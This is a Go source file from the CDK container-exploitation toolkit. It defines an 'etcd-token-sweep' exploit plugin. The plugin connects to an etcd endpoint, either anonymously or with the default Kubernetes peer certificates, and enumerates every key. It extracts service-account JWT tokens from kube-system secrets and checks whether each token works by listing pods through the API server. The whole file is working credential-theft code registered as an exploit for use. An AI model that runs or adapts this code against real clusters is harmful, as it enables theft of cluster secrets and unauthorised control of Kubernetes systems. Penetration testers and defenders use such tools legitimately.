//go:build !no_etcd_token_sweep
// +build !no_etcd_token_sweep

/*
Copyright 2022 The Authors of https://github.com/CDK-TEAM/CDK .

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

package credential_access

import (
	"crypto/tls"
	"crypto/x509"
	"fmt"
	"log"
	"net/url"
	"regexp"
	"sort"
	"strings"
	"time"

	"github.com/cdk-team/CDK/pkg/audit/base"

	"github.com/cdk-team/CDK/pkg/cli"
	"github.com/cdk-team/CDK/pkg/plugin"
	"github.com/cdk-team/CDK/pkg/tool/etcdctl"
	"github.com/cdk-team/CDK/pkg/tool/kubectl"
	"github.com/cdk-team/CDK/pkg/util"
	"github.com/tidwall/gjson"
)

const (
	defaultEtcdCert    = "/etc/kubernetes/pki/etcd/peer.crt"
	defaultEtcdCertKey = "/etc/kubernetes/pki/etcd/peer.key"
	defaultEtcdCa      = "/etc/kubernetes/pki/etcd/ca.crt"
	defaultEndpoint    = "http://127.0.0.1:2379"
)

var k8sTokenPath = "/registry/secrets/kube-system/"

// plugin interface
type EtcdGetToken struct{ base.BaseExploit }

func (p EtcdGetToken) Desc() string {
	var buffer strings.Builder

	buffer.WriteString("Connect to etcd and get token of k8s. ")
	buffer.WriteString("Notice to choose anonymous|default (need CA Cert). ")
	buffer.WriteString("Usage: cdk run etcd-token-sweep (anonymous|default) <endpoint> <cert> <cert_key> <ca>")

	return buffer.String()
}

func (p EtcdGetToken) Run() bool {
	args := cli.Args["<args>"].([]string)

	var (
		etcdCert    = defaultEtcdCert
		etcdCertKey = defaultEtcdCertKey
		etcdCa      = defaultEtcdCa
		endpoint    = defaultEndpoint
	)

	if len(args) == 0 {
		fmt.Println("Example: cdk run etcd-token-sweep anonymous http://172.16.61.10:2379")
		return false
	}

	tlsConfig := &tls.Config{}

	if args[0] == "default" {
		switch len(args) {
		case 1:
		case 2:
			endpoint = args[1]
		case 3:
			endpoint = args[1]
			etcdCert = args[2]
		case 4:
			endpoint = args[1]
			etcdCert = args[2]
			etcdCertKey = args[3]
		default:
			endpoint = args[1]
			etcdCert = args[2]
			etcdCertKey = args[3]
			etcdCa = args[4]
		}

		cert, err := tls.LoadX509KeyPair(etcdCert, etcdCertKey)
		if err != nil {
			fmt.Println("[etcd-get-token] run failed:", err.Error())
			return false
		}
		caData, err := util.StealthReadFile(etcdCa)
		pool := x509.NewCertPool()
		pool.AppendCertsFromPEM(caData)
		tlsConfig.Certificates = []tls.Certificate{cert}
		tlsConfig.RootCAs = pool
	} else {
		if len(args) <= 1 {
			return false
		}
		endpoint = args[1]
	}

	if !detectEtcdService(endpoint, tlsConfig) {
		return false
	}

	opt := etcdctl.EtcdRequestOption{
		Endpoint:  endpoint,
		Api:       "/v3/kv/range",
		Method:    "POST",
		PostData:  etcdctl.GenerateQuery("/"),
		TlsConfig: tlsConfig,
		Silent:    true,
	}

	var flag bool
	keys, err := collectEtcdKeysPaged(opt)
	if err != nil {
		log.Println(err)
		return flag
	}
	for k := range keys {
		if strings.HasPrefix(k, k8sTokenPath) {
			opt.PostData = etcdctl.GenerateQuery(k)
			resp1, err := etcdctl.DoRequest(opt)
			if err != nil {
				log.Println(err)
				return flag
			}
			kvs, err := etcdctl.GetKeys(resp1, opt.Silent)
			if err != nil {
				log.Println(err)
				return flag
			}
			for k, v := range kvs {
				if strings.Contains(v, "#kubernetes.io/service-account-token") {
					token := regexp.MustCompile("eyJh[\\w\\.-]+").FindString(v)
					if token != "" {
						flag = true
						fmt.Println(fmt.Sprintf("[%s] %s", k, util.RedactedValue(token)))
						resp, err := getPods(token, endpoint)
						if err == nil {
							pods := gjson.Get(resp, "items").Array()
							result := fmt.Sprintf("[etcd-token-sweep] There are %d pods in kube-system namespace.", len(pods))
							fmt.Println(result)
							// Port 6443/https is requested by default. If the token is valid, the function return.
							return flag
						}
					}
				}
			}
		}
	}
	return flag
}

func collectEtcdKeysPaged(opt etcdctl.EtcdRequestOption) (map[string]string, error) {
	collected := map[string]string{}
	startKey := "/"
	for {
		opt.PostData = etcdctl.GenerateRangeQuery(startKey, 100)
		resp, err := etcdctl.DoRequest(opt)
		if err != nil {
			return collected, err
		}
		keys, err := etcdctl.GetKeys(resp, opt.Silent)
		if err != nil {
			return collected, err
		}
		pageKeys := make([]string, 0, len(keys))
		for k, v := range keys {
			collected[k] = v
			pageKeys = append(pageKeys, k)
		}
		if !gjson.Get(resp, "more").Bool() || len(pageKeys) == 0 {
			return collected, nil
		}
		sort.Strings(pageKeys)
		startKey = pageKeys[len(pageKeys)-1] + "\x00"
		time.Sleep(20 * time.Millisecond)
	}
}

func detectEtcdService(endpoint string, tlsConfig *tls.Config) bool {
	opt := etcdctl.EtcdRequestOption{
		Endpoint:  endpoint,
		Api:       "/version",
		Method:    "GET",
		TlsConfig: tlsConfig,
		Silent:    true,
	}
	resp, err := etcdctl.DoRequest(opt)
	if err != nil {
		log.Printf("[etcd-token-sweep] skip: etcd service not detected at %s: %v", endpoint, err)
		return false
	}
	if gjson.Get(resp, "etcdserver").String() != "" || gjson.Get(resp, "etcdcluster").String() != "" {
		return true
	}
	log.Printf("[etcd-token-sweep] skip: %s did not return an etcd /version response", endpoint)
	return false
}

func getPods(token, endpoint string) (string, error) {
	u, _ := url.Parse(endpoint)
	opts := kubectl.K8sRequestOption{
		Token:  token,
		Server: "https://" + strings.Replace(u.Host, ":"+u.Port(), ":6443", -1),
		Api:    "/api/v1/namespaces/kube-system/pods",
		Method: "GET",
	}
	resp, err := kubectl.ServerAccountRequest(opts)
	return resp, err
}

func init() {
	exploit := EtcdGetToken{}
	exploit.ExploitType = "credential-access"
	plugin.RegisterExploit("etcd-token-sweep", exploit)
}
